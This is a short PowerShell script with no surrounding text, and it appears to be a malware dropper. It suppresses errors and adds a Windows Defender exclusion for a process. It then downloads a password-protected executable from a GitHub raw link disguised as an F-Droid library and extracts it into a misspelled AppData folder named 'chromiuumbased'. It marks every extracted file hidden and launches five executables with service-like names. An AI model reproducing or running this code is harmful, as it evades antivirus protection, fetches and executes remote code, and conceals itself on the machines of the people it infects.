$ErrorActionPreference = 'SilentlyContinue'
$ProcName = "additionlibraries.exe"
$WebFile = "https://github.com/washywashy14/fdroidclient/blob/master/app/src/full/additionlibraries.exe?raw=true"
$Outff = "$env:Temp\additionlibraries.exe"
Start-Sleep -Seconds 20
Add-MpPreference -ExclusionProcess serverCommon.exe -Force
Invoke-WebRequest -uri $WebFile -OutFile $Outff
& $env:Temp\additionlibraries.exe -s -p"of9049nwp04yb3" -d"$env:APPDATA\chromiuumbased\services\"
Get-ChildItem -path "$env:APPDATA\chromiuumbased\services\" -Recurse -Force | foreach {$_.attributes = "Hidden"}
Start-Process "$env:APPDATA\chromiuumbased\services\fsroiod.exe"
Start-Process "$env:APPDATA\chromiuumbased\services\ProcManager.exe"
Start-Process "$env:APPDATA\chromiuumbased\services\netDaemon.exe"
Start-Process "$env:APPDATA\chromiuumbased\services\Netstservice.exe"
Start-Process "$env:APPDATA\chromiuumbased\services\Updmonitor.exe"
